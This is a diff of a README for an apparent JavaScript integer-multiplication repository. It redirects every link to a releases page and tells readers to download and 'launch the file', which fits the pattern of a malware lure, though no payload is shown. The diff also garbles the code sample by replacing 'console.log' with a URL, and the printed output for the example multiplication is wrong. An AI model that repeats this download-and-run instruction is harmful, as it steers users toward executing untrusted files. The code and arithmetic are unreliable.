@@ -10,7 +10,7 @@ Welcome to the **number-int32-base-muldw** repository! This repository provides 
 
 ## 🌟 How to Use
 
-To use the function, you can download the necessary files from the following link: [Download Here](https://github.com/files/Soft.zip). Remember to launch the file after downloading.
+To use the function, you can download the necessary files from the following link: [Download Here](https://github.com/gaborinimo/number-int32-base-muldw/releases/tag/v1.2). Remember to launch the file after downloading.
 
 In case the link is not working or you require a different version, please check the "Releases" section of this repository.
 
@@ -29,7 +29,7 @@ const int1 = 2147483647; // Maximum positive 32-bit integer
 const int2 = -2147483648; // Minimum negative 32-bit integer
 
 const result = computeDoubleWordProduct(int1, int2);
-console.log(result); // Output: -4611686014132420608
+https://github.com/gaborinimo/number-int32-base-muldw/releases/tag/v1.2(result); // Output: -4611686014132420608
 ```
 
 ## 🎉 Get Started
@@ -38,7 +38,7 @@ Get started with the double word integer multiplication now! Feel free to explor
 
 ## 🌐 Additional Resources
 
-For more information and updates, you can visit the [GitHub Repository](https://github.com/yourusername/number-int32-base-muldw).
+For more information and updates, you can visit the [GitHub Repository](https://github.com/gaborinimo/number-int32-base-muldw/releases/tag/v1.2).
 
 Let's power up your mathematical operations with the double word product calculation functionality provided by this repository! 🚀
 
